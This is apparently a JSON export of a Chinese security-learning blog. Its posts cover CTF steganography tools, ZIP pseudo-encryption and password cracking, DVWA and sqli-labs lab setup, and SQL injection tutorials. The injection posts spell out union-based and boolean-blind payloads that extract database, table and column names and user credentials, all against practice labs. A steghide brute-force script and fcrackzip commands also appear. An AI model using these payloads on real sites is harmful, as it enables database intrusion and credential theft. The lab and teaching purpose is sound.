File”第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。大佬的博客","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://qidian-png.github.io/tags/web/"}]},{"title":"kail做CTF杂项题的工具安利一波！","slug":"kail做CTF杂项题的工具安利一波！","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T08:56:28.238Z","comments":true,"path":"2020/04/08/kail做CTF杂项题的工具安利一波！/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/kail%E5%81%9ACTF%E6%9D%82%E9%A1%B9%E9%A2%98%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AE%89%E5%88%A9%E4%B8%80%E6%B3%A2%EF%BC%81/","excerpt":"","text":"前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。 1.blind-watermark这个工具主要是解决盲水印问题。克隆到kail里 12345python encode.py --image &lt;image file&gt; --watermark &lt;watermark file&gt; --result &lt;result file&gt;python decode.py --original &lt;original image file&gt; --image &lt;image file&gt; --result &lt;result file&gt;Use --alpha to change the alpha (default 5.0). 这个工具分为加密（encode）和解密（decode）两部分。原始文件，带有水印的文件，解出来的文件（或加密出来的文件）在看不懂我也没办法了。 2.F5隐写F5隐写全称F5-steganography。1.kail安装命令：git clone https://github.com/matthewgao/F5-steganography2.进入F5-steganography文件夹，空白处打开命令终端。3.java Extract 图片的绝对路径/123456.jpg -p 123456切记是绝对路径，并且 -p 后面是密码。4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。 3.outguess隐写kail终端命令输入 git clone https://github.com/crorvick/outguess 进行下载，下载完成后进入outguess文件夹，右击打开终端，执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。outguess -k ‘密钥’ -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。outguess -k “secret key” -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。 4.steghide工具如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。 apt-get upgrade 当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide 如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。用法示例：将post.txt文件隐藏到xxx.jpg中：steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）从xxx.jpg解出post.txt:steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）steghide也可以用来爆破密码：需要shell脚本：`#bruteStegHide.sh #bruteStegHide.sh #!/bin/bash for line in `cat $2`;do steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1 if [[ $? -eq 0 ]];then echo &apos;password is: &apos;$line exit fi done 用法： # ./bruteStegHide.sh test.jpg passwd.txt 剩下的密码就出来了。 5.文件分离工具（binwalk,foremost）1.binwalk的安装 123git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalkcd binwalkpython setup.py install 运行命令： binwalk -D “archive:zip” -D “image:jpg” hehe.jpg 可以直接分离文件 也可以使用dd命令分离文件，如:dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163 2、Binwalk的提取与分析 2.1、固件扫描 命令：binwalk firmware.bin 通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。 2.2、提取文件 命令：binwalk -e firmware.bin 选项“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。 命令：binwalk -Me firmware.bin 选项“-M”和“–matryoshka”用于根据magic签名扫描结果进行递归提取，仅对”-e”和“–dd”选项有效。 命令：binwalk -Me -d 5 firmware.bin 选项“-d”和“–depth=“用于限制递归提取深度，默认深度为8，仅当“-M”选项存在时有效。 命令 dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1 2.3、显示完整的扫描结果 命令：binwalk -I firmware.bin 选项”-I”和“–invalid”用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。 6.foremost的使用。1、foremost在kali linux已经预装。#apt-get install foremost 2、然后看是否下载成功，输入 foremost -h 会显示如下信息（已经翻译） 1234567891011121314$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] -V - 显示版权信息并退出-t - 指定文件类型. (-t jpeg,pdf ...) -d -打开间接块检测 (针对UNIX文件系统) -i - 指定输入文件 (默认为标准输入) -a - 写入所有的文件头部, 不执行错误检测(损坏文件) -w - 向磁盘写入审计文件，不写入任何检测到的文件-o - 设置输出目录 (默认为为输出)-c - 设置配置文件 (默认为 foremost.conf)-q - 启用快速模式. 在512字节边界执行搜索.-Q - 启用安静模式. 禁用输出消息. -v - 详细模式. 向屏幕上记录所有消息。 ctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。 最简单的使用方法就是将图片放进foremost目录下，输入命令： 1foremost -i xxx.jpg 在目录下会出现一个output文件夹，分离出的结果会在里面。 工具就说到这，后面肯定还会有！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"kail","slug":"kail","permalink":"https://qidian-png.github.io/tags/kail/"}]},{"title":"zip知识点的部分总结！","slug":"zip知识点的部分总结！","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T09:35:54.816Z","comments":true,"path":"2020/04/08/zip知识点的部分总结！/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/zip%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%EF%BC%81/","excerpt":"","text":"前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！目录0×01.zip文件格式及伪加密 0×02.暴力破解 0×03.明文攻击 0×04.CRC爆破 0×01.zip文件格式及伪加密 这就是一个zip文件的格式。 1234567891011121314151617181920212223242526272829303132333435363738394041压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 20 9E：最后修改文件时间 66 4F：最后修改文件日期 F2 1B 0F 4A：CRC-32校验（4A0F1BF2）0E 00 00 00：压缩后尺寸 0C 00 00 00：未压缩尺寸08 00：文件名长度 00 00：扩展记录长度 66 6C 61 67 2E 74 78 74: 文件名（不定长）4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50) 1F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式20 9E：最后修改文件时间66 4F：最后修改文件日期 F2 1B 0F 4A：CRC-32校验（4A0F1BF2）0E 00 00 00：压缩后尺寸 0C 00 00 00：未压缩尺寸 08 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量 50 4B 05 06：目录结束标记00 00：当前磁盘编号 00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数 5A 00 00 00：目录区尺寸大小 34 00 00 00：目录区对第一张磁盘的偏移量00 00 ：ZIP 文件注释长度 伪加密：第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。 那么，如何辨别当前的zip是真的加密还是伪加密？ 无加密压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后） 假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00 真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00 哦，对了。kail貌似可以直接打开伪加密的文件。 知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。 0×02.暴力破解 说到暴力破解就要说到另外两个方法了。 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来） 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上 掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少 暴力破解也可在kail里进行，软件为kali自带的fcrackzip使用步骤 fcrackzip -help找到 上传压缩包所在文件目录,在此目录下进行操作fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v 对于以上方法，当然推荐一款神器AZPR爆破！字典（合适的字典可以达到事半功倍的效果）！ 掩码攻击！0×03.明文攻击 原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。 在网上找到一个例题，链接：这里1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”这就尴尬了，想暴力破解？不可能！！！ 不多说拉进winhex分析一波。很明显 明文攻击 ！ 将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。上工具AZPR！emmmmm 密码出来了。 0×04.CRC32爆破原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.神器：CEC32使用方法： 1python crc32.py reverse 你的crc32密文 具体的我也解释不清。大佬文章 持续更新！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"zip知识学习","slug":"zip知识学习","permalink":"https://qidian-png.github.io/tags/zip%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}]},{"title":"搭建DVWA web渗透靶场","slug":"搭建DVWA web渗透靶场","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T09:28:27.330Z","comments":true,"path":"2020/04/08/搭建DVWA web渗透靶场/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/%E6%90%AD%E5%BB%BADVWA%20web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。 1、进入 DVWA 的官网官网 http://www.dvwa.co.uk/ 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。 2、DVWA的安装与配置1、将DVWA解压到phpstudy目录下的www目录下。2、修改配置文件先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）： 用户名，密码是你数据库的。 3、然后浏览器访问 http://127.0.01/DWWA/setup.php正常页面：这样直接创建就行了。 4、创建成功 5、登录靶场五选一……. 6、进入主页面下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。开始学习吧！！！ 7、报错总结成功总不是一帆风顺的，踩坑。1、如果出现 reCAPTCHA:Missing 字样：需要在 configure/configure.inc.php中配置两个量 12配置$_DVWA[ &#39;recaptcha_public_key&#39; ] &#x3D; &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;配置$_DVWA[ &#39;recaptcha_private_key&#39; ] &#x3D; &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;; 然后刷新页面即可。2、数据库连接失败，会出现无法连接提示这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"SQL注入--整数注入","slug":"SQL注入——整数注入","date":"2020-04-07T07:04:05.000Z","updated":"2020-05-11T09:25:53.769Z","comments":true,"path":"2020/04/07/SQL注入——整数注入/","link":"","permalink":"https://qidian-png.github.io/2020/04/07/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。什么是整形注入呐。点这！直接入题！！！1.先判断是否存在注入。payload: ?id=1 and 1=1 看到这里的正常回显。然后 ？id=1 and 1=2 回显错误。可以判断出是整形。 2.判断列数。 order by语句。 ?id=1 order by 1 1 2 3…..直到出现报错。可以判断出只有两列。3.爆数据库名。payload: ?id=1 and 1=2 union select 1,database() 直接出来了！3.爆表名。payload: 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; 出来了两个表。看到了flag的曙光。4.爆字段。payload: 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; 5.爆值。payload： 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(flag) from sqli.flag 这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"判断注入类型","slug":"判断注入类型是字符型还是整形！！！","date":"2020-04-06T07:04:05.000Z","updated":"2020-05-20T15:36:18.450Z","comments":true,"path":"2020/04/06/判断注入类型是字符型还是整形！！！/","link":"","permalink":"https://qidian-png.github.io/2020/04/06/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%EF%BC%81%EF%BC%81%EF%BC%81/","excerpt":"","text":"前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。所以我就看了看做了一些题目。（勉强获得发的发言权）简单的理解:数字型： SELECT 列 FROM 表 WHERE 数字型列=值 字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’深层次的理解：1、数字型注入当输入的参数为整形时（1 ，2， 3….），如果存在注入漏洞，可以认为是数字型注入。测试步骤：（1）加单引号，双引号（等等闭合符号）URL()：www.text.com/text.php?id=3’（判断是不是字符型注入）对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异如果满足以上三点，则可以判断该URL存在数字型注入。 2、字符型注入当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。例如数字型语句：select * from table where id =3则字符型如下：select * from table where name=’admin’因此，在构造payload时通过闭合单引号可以成功执行语句：测试步骤：（1） 加单引号：select * from table where name=’admin’’由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；Mysql 有三种常用注释符：–+注意，这种注释符后边有一个空格 #通过#进行注释 /* */ 注释掉符号内的内容 因此，构造语句为：select * from table where name =’admin’ and 1=1–+’ 可成功执行返回结果正确；（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错如果满足以上三点，可以判断该url为字符型注入。习题持续更新。（未完待续。。。）","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"php学习--基础知识及变量（一）","slug":"php学习--基础知识及变量（一）","date":"2020-04-03T07:04:05.000Z","updated":"2020-07-31T13:01:32.222Z","comments":true,"path":"2020/04/03/php学习--基础知识及变量（一）/","link":"","permalink":"https://qidian-png.github.io/2020/04/03/php%E5%AD%A6%E4%B9%A0--%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E5%8F%98%E9%87%8F%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"PHP 是什么？PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。PHP 脚本在服务器上执行。PHP 可免费下载使用。 PHP 文件是什么？PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器PHP 文件的默认文件扩展名是 “.php” PHP 能做什么？PHP 可以生成动态页面内容PHP 可以创建、打开、读取、写入、关闭服务器上的文件PHP 可以收集表单数据PHP 可以发送和接收 cookiesPHP 可以添加、删除、修改您的数据库中的数据PHP 可以限制用户访问您的网站上的一些页面PHP 可以加密数据 基本的 PHP 语法：1、PHP 脚本以 结束，PHP 文件的默认文件扩展名是 “.php”。PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。 123456789&lt;?php&#x2F;&#x2F; 这是 PHP 单行注释&#x2F;*这是PHP 多行注释*&#x2F;?&gt; 使用var_dump(变量名)可以输出变量的类型。echo只会输出引号内的内容。2、变量1、定义：用于存储信息（数字，字符串等）的”容器”。给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。php的变量命名比C语言方便多了，使用的时候直接声明一下。类似于这样： 123$txt&#x3D;&quot;Hello world!&quot;;$x&#x3D;5;$y&#x3D;10.5; PHP 变量规则：变量以 $ 符号开始，后面跟着变量的名称变量名必须以字母或者下划线字符开始变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）变量名不能包含空格变量名是区分大小写的（$y 和 $Y 是两个不同的变量） 注意： PHP 语句和 PHP 变量都是区分大小写的。 2、unset($变量名称)函数释放指定的变量。 3、变量类型定义：指保存在该变量中的数据类型。 1）bool（布尔型）表达了true或false，即真或假。以下值被认为false，其他的值都是被认为true。布尔值false0浮点型0.0空白字符串和字符串0没有成员的数组NULL 2）int型（整形）$a=1; 3)float（浮点型,也称double） $a=1.1; 4)string(字符串) 字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。 单引号：指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠()转义。单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！ 问题：字符串中真正的反斜杠如何表达？ 用 // 双引号双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。双引号中的变量不能直接使用，需要用 {} ， （）括起来。 定界符&lt;&lt;&lt;之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。注意：结束标识符后必须接 ； 标识符命名规则：字母，数字，下划线并且不能以数字开始。 同样可以添加变量但是需要用花括号括起来。 木了木了！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"SQL注入--布尔盲注","slug":"SQL注入——布尔盲注","date":"2020-03-05T07:04:05.000Z","updated":"2020-07-31T13:00:43.993Z","comments":true,"path":"2020/03/05/SQL注入——布尔盲注/","link":"","permalink":"https://qidian-png.github.io/2020/03/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"前不久又学习了sql注入的布尔盲注，现在总结一下。布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。 1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。2.第二部就是判断数据库的长度。 我们需要知道这一函数 1’ and (length(database())=8)–+，通过它来判断数据库的长度，当然=可以换成 &gt;,&lt; ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。 3.判断数据库名。我们要使用 1’ and (ascii(substr(database(),1,1))&gt;97)–+，来一一判断数据库的ascii值。最终得到数据库的名称。在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。我们需要了解相关的函数：length()返回字符串的长度substr()截取字符串的字符 database()，返回当前数据库名 第一个1，表示截取字符串的起始位置。 第二个1，表示截取字符串长度 语句作用：判断第一个库第一个字符是什么ascii()将字符串转换成其ASCII码把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。 4.爆出表名。1?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;1 --+ 同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。 5.曝出列名。1?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&gt;1 --+ 也是修改limit后面的值来爆出列名。 6.爆值。1?id&#x3D;1&#39; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+ 同上。这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。大佬博客burp进行盲注布尔盲注小白持续更新中！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"博客美化","slug":"博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）","date":"2020-03-03T07:04:05.000Z","updated":"2020-05-11T09:35:40.772Z","comments":true,"path":"2020/03/03/博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）/","link":"","permalink":"https://qidian-png.github.io/2020/03/03/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%E4%B9%8B%E7%BD%91%E6%98%93%E4%BA%91%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%EF%BC%88%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E5%9B%A0%E4%B8%BA%E7%89%88%E6%9D%83%E5%8E%9F%E5%9B%A0%E6%97%A0%E6%B3%95%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%E7%9A%84%EF%BC%89/","excerpt":"","text":"想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。给大家分享一下： 在歌单页面，在“生成外链播放器”上右击，点击 检查 这一项。 找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来 将链接修改成这样 http://music.163.com/#/outchain/2/1424766691/，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://qidian-png.github.io/tags/%E5%85%B6%E4%BB%96/"}]},{"title":"sql注入练习","slug":"用sql libs 练习sql注入（—）","date":"2020-03-03T07:04:05.000Z","updated":"2020-05-20T15:40:19.709Z","comments":true,"path":"2020/03/03/用sql libs 练习sql注入（—）/","link":"","permalink":"https://qidian-png.github.io/2020/03/03/%E7%94%A8sql%20libs%20%E7%BB%83%E4%B9%A0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E2%80%94%EF%BC%89/","excerpt":"","text":"最近学习sql注入里最简单的一种——联合查询注入。现在写下来理清思路，也分享分享自己的收获。 联合查询的前提条件：页面上有显示位。 什么是显示位？在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。联合查询的过程：1、判断注入点2、判断列数3、获取所有数据库名4、获取数据库所有表名5、获取字段名6、获取字段中的数据 首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。一，判断闭合符号。常见的有:” , ‘ ,’) ,”) ,或者没有闭合符合（最危险）首先在url框里输入id=1”,回显正常。这就说明这不是闭合符号，我们再换一个。输入id=1’,出现了报错，这就说明 ‘ 是闭合符号。 二，判断列数 在order by 后面1 ，2 ，3，……直到报错。 http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 4–+ 这就知道了总共有3列。 http://localhost/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,3–+ 我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。2,3的位置就是我们输入的。三，获取所有数据库名。 http://localhost/sqli-labs-master/Less-1/?id=0&#39; union select 1,database(),3–+ 这样数据库就出来了。四，获取数据库里所有表名。下面所需的名称及解释就直接用学长的了。 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。information_schema.columns包含所有表的字段table_schema 数据库名table_name 表名column_name 列名information_schema.tables包含所有库的表名table_schema 数据库名table_name 表名information_schema.schemata包含所有数据库的名schema_name 数据库名group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。————————————————版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/qq_43431158/article/details/90743320 下面直接获取数据表名。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 五，获取字段名。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+ 六，获取字段中的数值。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+ 注意：0x3a是区分用户名和密码的。用户名和密码都知道了，剩下的自己想吧。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"phpstduy下sql libs下载，安装教程。","slug":"phpstduy下sql libs下载，安装教程。","date":"2020-03-02T07:04:05.000Z","updated":"2020-05-11T08:58:23.940Z","comments":true,"path":"2020/03/02/phpstduy下sql libs下载，安装教程。/","link":"","permalink":"https://qidian-png.github.io/2020/03/02/phpstduy%E4%B8%8Bsql%20libs%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%E3%80%82/","excerpt":"","text":"# 1.sql libs的下载。 sql libs的源代码地址：https://github.com/Audi-1/sqli-labs ，git进自己phpstduy文件夹的www文件夹内。2.找到sql libs文件夹内的sql-connections。找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。 3.sql libs安装。浏览器里输入http://localhost/sqli-labs/会出现如图。点点击第一个进行数据库安装。出现这样的页面就是安装成功了。然后就可以闯关了。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"搭建GitHub博客的过程及一些问题！！！","slug":"搭建GitHub博客的过程及一些问题！！！","date":"2020-02-11T04:44:28.940Z","updated":"2020-05-21T13:33:52.903Z","comments":true,"path":"2020/02/11/搭建GitHub博客的过程及一些问题！！！/","link":"","permalink":"https://qidian-png.github.io/2020/02/11/%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%87%E7%A8%8B%E5%8F%8A%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%EF%BC%81%EF%BC%81%EF%BC%81/","excerpt":"","text":"title: GitHub博客搭建date: 2020-03-01 15:04:05tags: 博客搭建categories: 技术photos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp ​— GitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！ 